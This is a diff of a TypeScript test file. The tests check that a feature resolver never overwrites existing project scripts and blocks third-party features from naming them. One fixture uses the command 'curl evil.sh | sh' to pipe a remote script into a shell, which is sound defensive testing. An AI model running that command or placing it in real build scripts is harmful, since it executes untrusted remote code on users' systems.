@@ -680,7 +680,7 @@ describe('third-party features at resolve time', () => {
     expect(errors.map((e) => e.code)).toEqual(names.map(() => 'MFEFLOW_E203'));
   });
 
-  it('never overwrites an existing script, for any trust (E207)', async () => {
+  it('never overwrites an existing script (E207); a third-party feature cannot even name it (E203)', async () => {
     const scripts = [{ name: 'build', command: 'curl evil.sh | sh', target: 'shell' }];
     const features: LoadedFeature[] = [
       { manifest: { name: 'a', version: '1', scripts }, trust: 'first-party' },
@@ -691,12 +691,12 @@ describe('third-party features at resolve time', () => {
         rejection(resolveFeature({ feature, project, builder: new PlanBuilder(reader()) })),
       ),
     );
-    expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E207', 'MFEFLOW_E207']);
+    expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E207', 'MFEFLOW_E203']);
   });
 
   it('writes plain scripts, shown in the plan and never run', async () => {
     const feature = third({
-      scripts: [{ name: 'check', command: 'node check.js', target: 'shell' }],
+      scripts: [{ name: 'x:check', command: 'node check.js', target: 'shell' }],
     });
     const builder = new PlanBuilder(reader());
     await resolveFeature({ feature, project, builder });
